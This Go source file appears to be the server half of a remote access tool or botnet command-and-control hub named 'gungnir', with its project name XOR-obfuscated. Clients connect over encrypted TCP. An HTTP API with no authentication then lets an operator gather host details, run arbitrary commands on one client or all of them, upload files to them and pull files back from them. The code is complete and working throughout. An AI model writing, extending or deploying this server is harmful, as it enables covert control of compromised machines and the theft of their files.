package main

import (
    "crypto/rand"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "log"
    "mime/multipart"
    "net"
    "net/http"
    "os"
    "path/filepath"
    "strings"
    "sync"
    "time"
    
    "golang.org/x/crypto/nacl/box"

    p "gungnir/internal/proto"
    u "gungnir/internal/utils"
    s "gungnir/internal/secure"
)

var BuildID string
var _ = BuildID

type Client struct {
    id   string
    conn net.Conn
    send chan *p.Message
    quit chan struct{}

    sess *s.Session

    pendingPub [32]byte
    pendingSec [32]byte
}

type Hub struct {
    mu      sync.RWMutex
    clients map[string]*Client
    banned  map[string]struct{}
    // pending responses by message ID
    pending sync.Map // map[string]chan *p.Message
}

func NewHub() *Hub {
    return &Hub{clients: make(map[string]*Client), banned: make(map[string]struct{})}
}

func (h *Hub) add(c *Client) {
    h.mu.Lock()
    defer h.mu.Unlock()
    h.clients[c.id] = c
}

func (h *Hub) remove(id string) {
    h.mu.Lock()
    defer h.mu.Unlock()
    delete(h.clients, id)
}

func (h *Hub) get(id string) (*Client, bool) {
    h.mu.RLock()
    defer h.mu.RUnlock()
    c, ok := h.clients[id]
    return c, ok
}

func (h *Hub) list() []string {
    h.mu.RLock()
    defer h.mu.RUnlock()
    out := make([]string, 0, len(h.clients))
    for id := range h.clients {
        out = append(out, id)
    }

    return out
}

func (h *Hub) isBanned(id string) bool {
    h.mu.RLock()
    _, ok := h.banned[id]
    h.mu.RUnlock()
    return ok
}

func (h *Hub) ban(id string) bool {
    h.mu.Lock()
    defer h.mu.Unlock()
    if _, ok := h.banned[id]; !ok {
        h.banned[id] = struct{}{}
    }
    if c, ok := h.clients[id]; ok {
        c.conn.Close()
        return true
    }
    return false
}

func (h *Hub) broadcast(msg *p.Message) int {
    h.mu.RLock()
    defer h.mu.RUnlock()
    count := 0
    for _, c := range h.clients {
        select {
        case c.send <- msg:
            count++
        default:
        	// drop if client is stuck
        }
    }

    return count
}

func (h *Hub) sendTo(id string, msg *p.Message) error {
    c, ok := h.get(id)
    if !ok {
        return fmt.Errorf("client %s not found", id)
    }

    select {
    case c.send <- msg:
        return nil
    default:
        return fmt.Errorf("client %s send buffer full", id)
    }
}

func (h *Hub) registerPending(msgID string) chan *p.Message {
    ch := make(chan *p.Message, 1)
    h.pending.Store(msgID, ch)
    return ch
}

func (h *Hub) fulfill(msg *p.Message) {
    if chv, ok := h.pending.Load(msg.ID); ok {
        ch := chv.(chan *p.Message)
        select {
        case ch <- msg:
        default:
        }
        h.pending.Delete(msg.ID)
    }
}

// ========== Chaves globais para novas conexões ==========

var (
    globalMu sync.RWMutex
    gPub     [32]byte
    gSec     [32]byte
)

func setGlobalServerKeys(pub, sec [32]byte) {
    globalMu.Lock()
    gPub, gSec = pub, sec
    globalMu.Unlock()
}

func getGlobalServerKeys() (pub, sec [32]byte) {
    globalMu.RLock()
    defer globalMu.RUnlock()
    return gPub, gSec
}

// ========== Accept loop ==========

func handleConn(h *Hub, conn net.Conn, serverPub, serverSec [32]byte) {
    defer conn.Close()

    // E2E Handshake
    sess, err := s.Server(conn, serverPub, serverSec)
    if err != nil {
        log.Printf("handshake falhou: %v", err)
        return
    }

    c := &Client{
        id:   "",
        conn: conn,
        send: make(chan *p.Message, 32),
        quit: make(chan struct{}),
        sess: sess,
    }

    // crypto writer
    go func() {
        for {
            select {
            case msg := <-c.send:
                b, err := json.Marshal(msg)
                if err != nil {
                    log.Printf("[client:%s] json marshal error: %v", c.id, err)
                    close(c.quit)
                    return
                }
                if err := c.sess.WriteMsg(b); err != nil {
                    log.Printf("[client:%s] write error: %v", c.id, err)
                    close(c.quit)
                    return
                }
            case <-c.quit:
                return
            }
        }
    }()

    // send build id
    hello := &p.Message{Type: "build_id", BuildID: BuildID}
    hb, _ := json.Marshal(hello)
    if err := c.sess.WriteMsg(hb); err != nil {
        log.Printf("failed to send build id: %v", err)
        return
    }

    // first frame must be register
    b, err := c.sess.ReadMsg()
    if err != nil {
        log.Printf("failed to read first message: %v", err)
        return
    }

    var first p.Message
    if err := json.Unmarshal(b, &first); err != nil {
        log.Printf("failed to decode first message: %v", err)
        return
    }

    if first.Type != "register" || first.ClientID == "" {
        log.Printf("rejecting connection without register, remote=%s", conn.RemoteAddr())
        return
    }

    c.id = first.ClientID
    if h.isBanned(c.id) {
        log.Printf("rejecting banned client: %s from %s", c.id, conn.RemoteAddr())
        return
    }
    h.add(c)
    log.Printf("client connected: %s from %s", c.id, conn.RemoteAddr())
    defer func() {
        h.remove(c.id)
        log.Printf("client disconnected: %s", c.id)
    }()

    // reader loop
    for {
        b, err := c.sess.ReadMsg()
        if err != nil {
            if errors.Is(err, io.EOF) {
                return
            }

            log.Printf("[client:%s] read error: %v", c.id, err)
            return
        }

        var msg p.Message
        if err := json.Unmarshal(b, &msg); err != nil {
            log.Printf("[client:%s] bad json: %v", c.id, err)
            return
        }

        switch msg.Type {
        case "file_ack", "cmd_result", "file", "pong", "info_result":
            h.fulfill(&msg)
        case "secure_reset_ack":
            // apply rekey in this session using the pending pair
            c.sess.RekeyServer(c.pendingPub, c.pendingSec)
            // clean pending
            c.pendingPub, c.pendingSec = [32]byte{}, [32]byte{}
        default:
            log.Printf("[client:%s] unexpected msg type=%s", c.id, msg.Type)
        }
    }
}

func tcpListen(h *Hub, addr string) {
    ln, err := net.Listen("tcp", addr)
    if err != nil {
        log.Fatalf("tcp listen failed: %v", err)
    }

    log.Printf("socket server listening on %s", addr)

    for {
        conn, err := ln.Accept()
        if err != nil {
            log.Printf("accept error: %v", err)
            continue
        }

        pub, sec := getGlobalServerKeys()
        go handleConn(h, conn, pub, sec)
    }
}

// ========== HTTP API ==========

type pingReq struct {
    ClientID string `json:"client_id"` // empty means broadcast
    TimeoutS int    `json:"timeout_s"` // optional, default 60
}

type pingResult struct {
    ClientID string `json:"client_id"`
    OK       bool   `json:"ok"`
    Error    string `json:"error,omitempty"`
}

func handlePing(h *Hub) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        defer r.Body.Close()

        var req pingReq
        if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
            http.Error(w, "invalid json", 400)
            return
        }

        if req.TimeoutS <= 0 {
            req.TimeoutS = 60
        }

        deadline := time.After(time.Duration(req.TimeoutS) * time.Second)

        if req.ClientID != "" {
            id := p.NewID()
            ch := h.registerPending(id)
            if err := h.sendTo(req.ClientID, &p.Message{ID: id, Type: "ping"}); err != nil {
                http.Error(w, err.Error(), 404)
                return
            }

            select {
            case <-ch:
                writeJSON(w, pingResult{ClientID: req.ClientID, OK: true})
            case <-deadline:
                http.Error(w, "timeout waiting for pong", 504)
            }

            return
        }

        h.mu.RLock()
        targets := make([]string, 0, len(h.clients))
        for id := range h.clients {
            targets = append(targets, id)
        }
        h.mu.RUnlock()

        if len(targets) == 0 {
            writeJSON(w, []pingResult{})
            return
        }

        type waitItem struct {
            id string
            ch chan *p.Message
        }

        waiters := make(map[string]waitItem, len(targets))
        for _, cid := range targets {
            id := p.NewID()
            ch := h.registerPending(id)
            _ = h.sendTo(cid, &p.Message{ID: id, Type: "ping"})
            waiters[cid] = waitItem{id: id, ch: ch}
        }

        out := make([]pingResult, 0, len(targets))
        timeout := time.NewTimer(time.Duration(req.TimeoutS) * time.Second)
        defer timeout.Stop()

        var wg sync.WaitGroup
        var mu sync.Mutex
        for cid, wi := range waiters {
            wg.Add(1)
            go func(cid string, wi waitItem) {
                defer wg.Done()
                select {
                case <-wi.ch:
                    mu.Lock()
                    out = append(out, pingResult{ClientID: cid, OK: true})
                    mu.Unlock()
                case <-timeout.C:
                    mu.Lock()
                    out = append(out, pingResult{ClientID: cid, OK: false, Error: "timeout"})
                    mu.Unlock()
                }
            }(cid, wi)
        }

        wg.Wait()
        writeJSON(w, out)
    }
}

type infoReq struct {
    ClientID string `json:"client_id"` // empty means broadcast
    TimeoutS int    `json:"timeout_s"` // optional, default 60
}

type infoResponse struct {
    ClientID string `json:"client_id"`
    Hostname string `json:"hostname"`
    OS       string `json:"os"`
    Arch     string `json:"arch"`
    Username string `json:"username"`
    Error    string `json:"error,omitempty"`
}

func handleInfo(h *Hub) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        defer r.Body.Close()

        var req infoReq
        if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
            http.Error(w, "invalid json", 400)
            return
        }

        if req.TimeoutS <= 0 {
            req.TimeoutS = 60
        }

        deadline := time.After(time.Duration(req.TimeoutS) * time.Second)

        if req.ClientID != "" {
            id := p.NewID()
            ch := h.registerPending(id)
            if err := h.sendTo(req.ClientID, &p.Message{ID: id, Type: "info"}); err != nil {
                http.Error(w, err.Error(), 404)
                return
            }

            select {
            case resp := <-ch:
                writeJSON(w, infoResponse{
                    ClientID: req.ClientID,
                    Hostname: resp.Hostname,
                    OS:       resp.OS,
                    Arch:     resp.Arch,
                    Username: resp.Username,
                    Error:    resp.Error,
                })
            case <-deadline:
                http.Error(w, "timeout waiting for response", 504)
            }

            return
        }

        h.mu.RLock()
        targets := make([]string, 0, len(h.clients))
        for id := range h.clients {
            targets = append(targets, id)
        }
        h.mu.RUnlock()

        if len(targets) == 0 {
            writeJSON(w, []infoResponse{})
            return
        }

        type waitItem struct {
            id string
            ch chan *p.Message
        }

        waiters := make(map[string]waitItem, len(targets))
        for _, cid := range targets {
            id := p.NewID()
            ch := h.registerPending(id)
            waiters[cid] = waitItem{id: id, ch: ch}
            _ = h.sendTo(cid, &p.Message{ID: id, Type: "info"})
        }

        out := make([]infoResponse, 0, len(targets))
        timeout := time.NewTimer(time.Duration(req.TimeoutS) * time.Second)
        defer timeout.Stop()

        var wg sync.WaitGroup
        mu := sync.Mutex{}

        for cid, wi := range waiters {
            wg.Add(1)
            go func(cid string, wi waitItem) {
                defer wg.Done()
                select {
                case resp := <-wi.ch:
                    mu.Lock()
                    out = append(out, infoResponse{
                        ClientID: cid,
                        Hostname: resp.Hostname,
                        OS:       resp.OS,
                        Arch:     resp.Arch,
                        Username: resp.Username,
                        Error:    resp.Error,
                    })
                    mu.Unlock()
                case <-timeout.C:
                    mu.Lock()
                    out = append(out, infoResponse{
                        ClientID: cid,
                        Error:    "timeout",
                    })
                    mu.Unlock()
                }
            }(cid, wi)
        }

        wg.Wait()
        writeJSON(w, out)
    }
}

type sendCmdReq struct {
    ClientID string `json:"client_id"` // empty means broadcast
    Command  string `json:"command"`
    TimeoutS int    `json:"timeout_s"` // optional, default 60
}

type cmdResponse struct {
    ClientID string `json:"client_id"`
    Output   string `json:"output"`
    ExitCode int    `json:"exit_code"`
    Error    string `json:"error,omitempty"`
}

func handleSendCmd(h *Hub) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        defer r.Body.Close()

        var req sendCmdReq
        if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
            http.Error(w, "invalid json", 400)
            return
        }

        if strings.TrimSpace(req.Command) == "" {
            http.Error(w, "command is required", 400)
            return
        }

        if req.TimeoutS <= 0 {
            req.TimeoutS = 60
        }

        msgID := p.NewID()
        msg := &p.Message{
            ID:      msgID,
            Type:    "cmd",
            Command: req.Command,
        }

        deadline := time.After(time.Duration(req.TimeoutS) * time.Second)

        if req.ClientID != "" {
            ch := h.registerPending(msgID)
            if err := h.sendTo(req.ClientID, msg); err != nil {
                http.Error(w, err.Error(), 404)
                return
            }

            select {
            case resp := <-ch:
                writeJSON(w, cmdResponse{
                    ClientID: req.ClientID,
                    Output:   resp.Output,
                    ExitCode: resp.ExitCode,
                    Error:    resp.Error,
                })
            case <-deadline:
                http.Error(w, "timeout waiting for response", 504)
            }

            return
        }

        // broadcast
        h.mu.RLock()
        targets := make([]string, 0, len(h.clients))
        for id := range h.clients {
            targets = append(targets, id)
        }

        h.mu.RUnlock()

        if len(targets) == 0 {
            writeJSON(w, []cmdResponse{})
            return
        }

        type waitItem struct {
            id string
            ch chan *p.Message
        }

        waiters := make(map[string]waitItem, len(targets))
        for _, cid := range targets {
            id := p.NewID()
            ch := h.registerPending(id)
            waiters[cid] = waitItem{id: id, ch: ch}
            copyMsg := *msg
            copyMsg.ID = id
            _ = h.sendTo(cid, &copyMsg)
        }

        out := make([]cmdResponse, 0, len(targets))
        timeout := time.NewTimer(time.Duration(req.TimeoutS) * time.Second)
        defer timeout.Stop()

        var wg sync.WaitGroup
        mu := sync.Mutex{}

        for cid, wi := range waiters {
            wg.Add(1)
            go func(cid string, wi waitItem) {
                defer wg.Done()
                select {
                case resp := <-wi.ch:
                    mu.Lock()
                    out = append(out, cmdResponse{
                        ClientID: cid,
                        Output:   resp.Output,
                        ExitCode: resp.ExitCode,
                        Error:    resp.Error,
                    })
                    mu.Unlock()
                case <-timeout.C:
                    mu.Lock()
                    out = append(out, cmdResponse{
                        ClientID: cid,
                        Error:    "timeout",
                    })
                    mu.Unlock()
                }
            }(cid, wi)
        }

        wg.Wait()
        writeJSON(w, out)
    }
}

type fileSendResult struct {
    ClientID string `json:"client_id"`
    OK       bool   `json:"ok"`
    Error    string `json:"error,omitempty"`
}

func handleSendFile(h *Hub, maxMem int64) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        if err := r.ParseMultipartForm(maxMem); err != nil {
            http.Error(w, "multipart parse error", 400)
            return
        }

        dstPath := strings.TrimSpace(r.FormValue("path"))
        clientID := strings.TrimSpace(r.FormValue("client_id"))

        timeoutS := 60
        if v := strings.TrimSpace(r.FormValue("timeout_s")); v != "" {
            fmt.Sscanf(v, "%d", &timeoutS)
            if timeoutS <= 0 {
                timeoutS = 60
            }
        }

        file, hdr, err := r.FormFile("file")
        if err != nil {
            http.Error(w, "file is required", 400)
            return
        }

        defer file.Close()
        data, err := readAllPart(file, hdr)
        if err != nil {
            http.Error(w, "failed to read file: "+err.Error(), 500)
            return
        }

        if dstPath == "" {
            dstPath = filepath.Base(hdr.Filename)
        }

        sum := p.SHA256Hex(data)
        deadline := time.After(time.Duration(timeoutS) * time.Second)

        if clientID != "" {
            msgID := p.NewID()
            ch := h.registerPending(msgID)
            msg := &p.Message{
                ID:       msgID,
                Type:     "file",
                FilePath: dstPath,
                Data:     data,
                Checksum: sum,
            }

            if err := h.sendTo(clientID, msg); err != nil {
                http.Error(w, err.Error(), 404)
                return
            }

            select {
            case resp := <-ch:
                writeJSON(w, fileSendResult{
                    ClientID: clientID,
                    OK:       resp.Error == "",
                    Error:    resp.Error,
                })
            case <-deadline:
                http.Error(w, "timeout waiting for ack", 504)
            }

            return
        }

        // broadcast
        h.mu.RLock()
        targets := make([]string, 0, len(h.clients))
        for id := range h.clients {
            targets = append(targets, id)
        }

        h.mu.RUnlock()
        if len(targets) == 0 {
            writeJSON(w, []fileSendResult{})
            return
        }

        type waitItem struct {
            id string
            ch chan *p.Message
        }

        waiters := make(map[string]waitItem, len(targets))
        for _, cid := range targets {
            id := p.NewID()
            ch := h.registerPending(id)
            msg := &p.Message{
                ID:       id,
                Type:     "file",
                FilePath: dstPath,
                Data:     data,
                Checksum: sum,
            }
            _ = h.sendTo(cid, msg)
            waiters[cid] = waitItem{id: id, ch: ch}
        }

        out := make([]fileSendResult, 0, len(targets))
        timeout := time.NewTimer(time.Duration(timeoutS) * time.Second)
        defer timeout.Stop()

        var wg sync.WaitGroup
        var mu sync.Mutex
        for cid, wi := range waiters {
            wg.Add(1)
            go func(cid string, wi waitItem) {
                defer wg.Done()
                select {
                case resp := <-wi.ch:
                    ok := resp.Error == ""
                    mu.Lock()
                    out = append(out, fileSendResult{ClientID: cid, OK: ok, Error: resp.Error})
                    mu.Unlock()
                case <-timeout.C:
                    mu.Lock()
                    out = append(out, fileSendResult{ClientID: cid, OK: false, Error: "timeout"})
                    mu.Unlock()
                }
            }(cid, wi)
        }

        wg.Wait()
        writeJSON(w, out)
    }
}

type pullFileReq struct {
    ClientID string `json:"client_id"` // empty = broadcast
    SrcPath  string `json:"src_path"`  // path on client
    DstPath  string `json:"dst_path"`  // path on the server where to save
    TimeoutS int    `json:"timeout_s,omitempty"`
}

type pullFileResult struct {
    ClientID string `json:"client_id"`
    SavedAs  string `json:"saved_as"`
    Bytes    int    `json:"bytes"`
    Checksum string `json:"checksum,omitempty"`
    Error    string `json:"error,omitempty"`
}

func handlePullFile(h *Hub) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        defer r.Body.Close()

        var req pullFileReq
        if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
            http.Error(w, "invalid json", 400)
            return
        }

        if strings.TrimSpace(req.SrcPath) == "" || strings.TrimSpace(req.DstPath) == "" {
            http.Error(w, "src_path and dst_path are required", 400)
            return
        }

        if req.TimeoutS <= 0 {
            req.TimeoutS = 60
        }

        save := func(path string, data []byte) error {
            dir := filepath.Dir(path)
            if dir != "." {
                if err := os.MkdirAll(dir, 0o755); err != nil {
                    return err
                }
            }

            return os.WriteFile(path, data, 0o644)
        }

        // single client
        if req.ClientID != "" {
            msgID := p.NewID()
            ch := h.registerPending(msgID)
            if err := h.sendTo(req.ClientID, &p.Message{
                ID:       msgID,
                Type:     "pull_file",
                FilePath: req.SrcPath,
            }); err != nil {
                http.Error(w, err.Error(), 404)
                return
            }

            select {
            case resp := <-ch:
                if resp.Error != "" {
                    writeJSON(w, pullFileResult{
                        ClientID: req.ClientID,
                        SavedAs:  "",
                        Bytes:    0,
                        Checksum: resp.Checksum,
                        Error:    resp.Error,
                    })

                    return
                }

                if err := save(req.DstPath, resp.Data); err != nil {
                    writeJSON(w, pullFileResult{
                        ClientID: req.ClientID,
                        SavedAs:  "",
                        Bytes:    len(resp.Data),
                        Checksum: resp.Checksum,
                        Error:    err.Error(),
                    })

                    return
                }

                writeJSON(w, pullFileResult{
                    ClientID: req.ClientID,
                    SavedAs:  req.DstPath,
                    Bytes:    len(resp.Data),
                    Checksum: resp.Checksum,
                })
            case <-time.After(time.Duration(req.TimeoutS) * time.Second):
                http.Error(w, "timeout waiting for file", 504)
            }

            return
        }

        // broadcast
        h.mu.RLock()
        targets := make([]string, 0, len(h.clients))
        for id := range h.clients {
            targets = append(targets, id)
        }

        h.mu.RUnlock()
        if len(targets) == 0 {
            writeJSON(w, []pullFileResult{})
            return
        }

        type waiter struct {
            id string
            ch chan *p.Message
        }

        waiters := map[string]waiter{}
        for _, cid := range targets {
            id := p.NewID()
            ch := h.registerPending(id)
            _ = h.sendTo(cid, &p.Message{
                ID:       id,
                Type:     "pull_file",
                FilePath: req.SrcPath,
            })
            waiters[cid] = waiter{id: id, ch: ch}
        }

        out := make([]pullFileResult, 0, len(targets))
        var wg sync.WaitGroup
        var mu sync.Mutex
        timeout := time.NewTimer(time.Duration(req.TimeoutS) * time.Second)
        defer timeout.Stop()

        for cid, wi := range waiters {
            wg.Add(1)
            go func(cid string, wi waiter) {
                defer wg.Done()
                select {
                case resp := <-wi.ch:
                    if resp.Error != "" {
                        mu.Lock()
                        out = append(out, pullFileResult{ClientID: cid, Error: resp.Error, Checksum: resp.Checksum})
                        mu.Unlock()
                        return
                    }

                    dst := req.DstPath
                    if len(targets) > 1 {
                        dst = adjustDstForClient(req.DstPath, req.SrcPath, cid)
                    }

                    if err := save(dst, resp.Data); err != nil {
                        mu.Lock()
                        out = append(out, pullFileResult{ClientID: cid, SavedAs: "", Bytes: len(resp.Data), Checksum: resp.Checksum, Error: err.Error()})
                        mu.Unlock()
                        return
                    }

                    mu.Lock()
                    out = append(out, pullFileResult{ClientID: cid, SavedAs: dst, Bytes: len(resp.Data), Checksum: resp.Checksum})
                    mu.Unlock()
                case <-timeout.C:
                    mu.Lock()
                    out = append(out, pullFileResult{ClientID: cid, Error: "timeout"})
                    mu.Unlock()
                }
            }(cid, wi)
        }

        wg.Wait()
        writeJSON(w, out)
    }
}

func adjustDstForClient(dst, src, cid string) string {
    if strings.HasSuffix(dst, "/") {
        base := filepath.Base(src)
        return filepath.Join(dst, base+"."+cid)
    }

    dir := filepath.Dir(dst)
    base := filepath.Base(dst)
    ext := filepath.Ext(base)
    name := strings.TrimSuffix(base, ext)
    return filepath.Join(dir, fmt.Sprintf("%s.%s%s", name, cid, ext))
}

func handleListClients(h *Hub) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        writeJSON(w, h.list())
    }
}

func readAllPart(file multipart.File, _ *multipart.FileHeader) ([]byte, error) {
    return io.ReadAll(file)
}

func writeJSON(w http.ResponseWriter, v any) {
    w.Header().Set("Content-Type", "application/json")
    enc := json.NewEncoder(w)
    enc.SetIndent("", "  ")
    _ = enc.Encode(v)
}

// ========== Rotação de chaves com OpReset ==========

type rotateResp struct {
    NewPub string   `json:"new_pub_hex"`
    Sent   []string `json:"sent"`
}

func handleRotateKeys(h *Hub) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        // generate new pair
        np, ns, err := box.GenerateKey(rand.Reader)
        if err != nil { http.Error(w, "keygen failed", 500); return }
        newPub, newSec := *np, *ns

        // clients snapshot
        h.mu.RLock()
        clients := make([]*Client, 0, len(h.clients))
        for _, c := range h.clients {
            clients = append(clients, c)
        }
        h.mu.RUnlock()

        sent := make([]string, 0, len(clients))
        for _, c := range clients {
            c.pendingPub = newPub
            c.pendingSec = newSec
            // sends secure_reset with new pub in Data
            id := p.NewID()
            _ = h.sendTo(c.id, &p.Message{
                ID:   id,
                Type: "secure_reset",
                Data: newPub[:],
            })
            sent = append(sent, c.id)
        }

        setGlobalServerKeys(newPub, newSec)

        writeJSON(w, rotateResp{NewPub: hex.EncodeToString(newPub[:]), Sent: sent})
    }
}

type banReq struct {
    ClientID string `json:"client_id"`
}

type banResp struct {
    ClientID string `json:"client_id"`
    Banned   bool   `json:"banned"`
}

func handleBanClient(h *Hub) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        defer r.Body.Close()

        var req banReq
        if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.ClientID == "" {
            http.Error(w, "invalid json", 400)
            return
        }

        if ok := h.ban(req.ClientID); !ok {
            http.Error(w, "client not found", 404)
            return
        }

        writeJSON(w, banResp{ClientID: req.ClientID, Banned: true})
    }
}

// ========== Boot ==========

func logRequests(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        log.Printf("%s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
        next.ServeHTTP(w, r)
    })
}

func getenv(k, def string) string {
    if v := strings.TrimSpace(os.Getenv(k)); v != "" {
        return v
    }

    return def
}

func main() {
    log.Printf("Build ID: %s", BuildID)
    log.Printf("Project: %s", u.Xor("\x99\x8b\x90\x99\x90\x97\x8c"))

    addrTCP := getenv("SOCK_ADDR", ":9000")
    addrHTTP := getenv("HTTP_ADDR", ":8080")

    pubPtr, secPtr, err := box.GenerateKey(rand.Reader)
    if err != nil { log.Fatalf("keygen failed: %v", err) }
    setGlobalServerKeys(*pubPtr, *secPtr)

    hub := NewHub()
    go tcpListen(hub, addrTCP)

    mux := http.NewServeMux()
    mux.HandleFunc("GET /clients", handleListClients(hub))
    mux.HandleFunc("POST /ping", handlePing(hub))
    mux.HandleFunc("POST /info", handleInfo(hub))
    mux.HandleFunc("POST /send-cmd", handleSendCmd(hub))
    mux.HandleFunc("POST /send-file", handleSendFile(hub, 256<<20))
    mux.HandleFunc("POST /pull-file", handlePullFile(hub))
    mux.HandleFunc("POST /rotate-keys", handleRotateKeys(hub))
    mux.HandleFunc("POST /ban-client", handleBanClient(hub))

    srv := &http.Server{
        Addr:              addrHTTP,
        Handler:           logRequests(mux),
        ReadHeaderTimeout: 5 * time.Second,
    }

    log.Printf("http API listening on %s", addrHTTP)
    log.Fatal(srv.ListenAndServe())
}

